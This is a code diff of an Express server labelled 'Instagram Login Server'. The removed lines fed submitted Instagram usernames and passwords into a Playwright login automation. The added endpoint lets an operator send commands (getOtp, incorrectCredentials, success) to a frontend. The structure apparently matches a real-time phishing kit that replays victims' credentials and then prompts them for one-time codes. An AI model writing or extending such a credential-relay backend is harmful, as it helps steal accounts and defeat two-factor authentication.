@@ -1,6 +1,5 @@
 const express = require('express');
 const cors = require('cors');
-const { automateInstagramLogin } = require('./playwright-automation');
 
 const app = express();
 
@@ -23,39 +22,45 @@ app.get('/health', (req, res) => {
 app.get('/', (req, res) => {
   res.json({ 
     status: 'ok', 
-    message: 'Instagram Automation Server',
+    message: 'Instagram Login Server',
     endpoints: {
       health: '/health',
-      automateLogin: '/api/automate-login'
+      loginResponse: '/api/login-response'
     }
   });
 });
 
-app.post('/api/automate-login', async (req, res) => {
-  const { username, password } = req.body;
+// Simple API endpoint for console commands
+app.post('/api/login-response', (req, res) => {
+  const { command } = req.body;
   
-  if (!username || !password) {
+  if (!command) {
     return res.status(400).json({ 
       success: false, 
-      error: 'Username and password are required' 
+      error: 'Command is required. Use: getOtp, incorrectCredentials, or success' 
     });
   }
   
-  try {
-    console.log('Starting Instagram automation...');
-    const result = await automateInstagramLogin(username, password);
-    res.json(result);
-  } catch (error) {
-    console.error('Automation error:', error);
-    res.status(500).json({ 
+  const validCommands = ['getOtp', 'incorrectCredentials', 'success'];
+  
+  if (!validCommands.includes(command)) {
+    return res.status(400).json({ 
       success: false, 
-      error: error.message || 'Failed to automate login' 
+      error: `Invalid command. Use one of: ${validCommands.join(', ')}` 
     });
   }
+  
+  // Return the command to be handled by the frontend
+  res.json({ 
+    success: true, 
+    command: command,
+    message: `Command received: ${command}` 
+  });
 });
 
 const PORT = process.env.PORT || 3001;
 const HOST = process.env.HOST || '0.0.0.0';
 app.listen(PORT, HOST, () => {
-  console.log(`Automation server running on ${HOST}:${PORT}`);
+  console.log(`Server running on ${HOST}:${PORT}`);
+  console.log('Available commands: getOtp, incorrectCredentials, success');
 });
